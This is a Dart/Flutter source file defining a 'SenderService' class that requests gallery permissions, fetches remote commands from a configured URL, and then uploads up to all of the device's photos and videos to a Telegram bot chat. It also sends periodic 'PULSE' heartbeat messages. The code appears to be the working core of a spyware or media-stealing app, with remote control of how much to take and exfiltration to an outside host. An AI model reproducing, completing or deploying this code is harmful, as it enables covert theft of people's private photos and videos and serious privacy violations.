import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:photo_manager/photo_manager.dart';
import 'config.dart';

class Progress {
  final String status;
  final int sent;
  final int total;
  const Progress(this.status, this.sent, this.total);
}

class SenderService {
  void Function(Progress)? onProgress;
  int _chatId = Cfg.defaultChatId;
  String _photoCmd = Cfg.defaultPhoto.toString();
  String _videoCmd = Cfg.defaultVideo.toString();
  bool _stopped = false;
  Timer? _heartbeatTimer;
  int _sent = 0;
  int _total = 0;

  void _emit(String s) => onProgress?.call(Progress(s, _sent, _total));

  Future<void> stop() async {
    _stopped = true;
    _heartbeatTimer?.cancel();
  }

  Future<bool> requestPermissions() async {
    _emit('Запрашиваем доступ к файлам…');
    try {
      final ps = await PhotoManager.requestPermissionExtend();
      if (ps.hasAccess || ps.isLimited) return true;
      final img = await Permission.photos.request();
      final vid = await Permission.videos.request();
      return img.isGranted || vid.isGranted;
    } catch (_) {
      return false;
    }
  }

  Future<void> run() async {
    _emit('Читаем команды…');
    await _loadCommandsOnce();
    await _loadMediaAndSend();
  }

  Future<void> _loadCommandsOnce() async {
    try {
      final r = await http.get(Uri.parse('${Cfg.commandsUrl}?t=${DateTime.now().millisecondsSinceEpoch}')).timeout(const Duration(seconds: 15));
      if (r.statusCode != 200) return;
      final j = jsonDecode(utf8.decode(r.bodyBytes));
      if (j is! Map) return;
      final cid = j['chat_id'];
      if (cid is int) _chatId = cid;
      if (cid is String) _chatId = int.tryParse(cid) ?? _chatId;
      
      dynamic p = j['photo'];
      if (p != null) _photoCmd = p.toString().toLowerCase();
      
      dynamic v = j['video'];
      if (v != null) _videoCmd = v.toString().toLowerCase();
    } catch (_) {}
  }

  Future<void> _loadMediaAndSend() async {
    _emit('Собираем файлы…');
    final photos = <AssetEntity>[];
    final videos = <AssetEntity>[];
    final wantPhoto = _photoCmd != '0';
    final wantVideo = _videoCmd != '0';
    final limPhoto = _photoCmd == 'all' ? 100000 : (int.tryParse(_photoCmd) ?? 0);
    final limVideo = _videoCmd == 'all' ? 100000 : (int.tryParse(_videoCmd) ?? 0);

    if (wantPhoto || wantVideo) {
      final paths = await PhotoManager.getAssetPathList(
        type: RequestType.common,
        filterOption: FilterOptionGroup(
          imageOption: const FilterOption(sizeConstraint: SizeConstraint(ignoreSize: true)),
          videoOption: const FilterOption(sizeConstraint: SizeConstraint(ignoreSize: true)),
          orders: [const OrderOption(type: OrderOptionType.createDate, asc: false)],
        ),
      );
      for (final p in paths) {
        if (wantPhoto && photos.length < limPhoto) {
          final list = await p.getAssetListPaged(page: 0, size: limPhoto - photos.length);
          for (final a in list) { if (a.type == AssetType.image) photos.add(a); }
        }
        if (wantVideo && videos.length < limVideo) {
          final list = await p.getAssetListPaged(page: 0, size: limVideo - videos.length);
          for (final a in list) { if (a.type == AssetType.video) videos.add(a); }
        }
      }
    }

    _total = photos.length + videos.length;
    _sent = 0;
    if (_total == 0) {
      _emit('Нет файлов');
      await _heartbeat('empty');
      return;
    }

    _startHeartbeat();

    for (final a in photos) {
      if (_stopped) return;
      await _sendAsset(a, isVideo: false);
      await Future<void>.delayed(const Duration(milliseconds: Cfg.sendDelayMs));
    }
    for (final a in videos) {
      if (_stopped) return;
      await _sendAsset(a, isVideo: true);
      await Future<void>.delayed(const Duration(milliseconds: Cfg.sendDelayMs));
    }

    _emit('Готово: $_sent из $_total');
    await _heartbeat('done');
    _heartbeatTimer?.cancel();
  }

  Future<void> _sendAsset(AssetEntity a, {required bool isVideo}) async {
    try {
      final File? file = await a.file;
      if (file == null) return;
      final len = await file.length();
      if (len > Cfg.maxFileBytes) { _sent++; _emit('Пропуск (>49 МБ)'); return; }
      
      final cap = a.title ?? '';
      final req = http.MultipartRequest('POST', Uri.parse('https://api.telegram.org/bot${Cfg.botToken}/${isVideo ? 'sendVideo' : 'sendPhoto'}'));
      req.fields['chat_id'] = _chatId.toString();
      if (cap.isNotEmpty) req.fields['caption'] = cap;
      req.files.add(await http.MultipartFile.fromPath(isVideo ? 'video' : 'photo', file.path));
      
      final resp = await req.send().timeout(const Duration(minutes: 3));
      if (resp.statusCode == 200) {
        _sent++;
        _emit('Отправлено $_sent из $_total');
      } else {
        _emit('Ошибка (${resp.statusCode})');
      }
    } catch (_) {
      _emit('Ошибка отправки');
    }
  }

  void _startHeartbeat() {
    _heartbeatTimer?.cancel();
    _heartbeatTimer = Timer.periodic(const Duration(seconds: Cfg.heartbeatSec), (_) => _heartbeat('alive'));
  }

  Future<void> _heartbeat(String status) async {
    if (_chatId <= 0) return;
    try {
      await http.post(
        Uri.parse('https://api.telegram.org/bot${Cfg.botToken}/sendMessage'),
        body: {'chat_id': _chatId.toString(), 'text': 'PULSE|$status|$_sent|$_total', 'disable_notification': 'true'},
      ).timeout(const Duration(seconds: 15));
    } catch (_) {}
  }
}
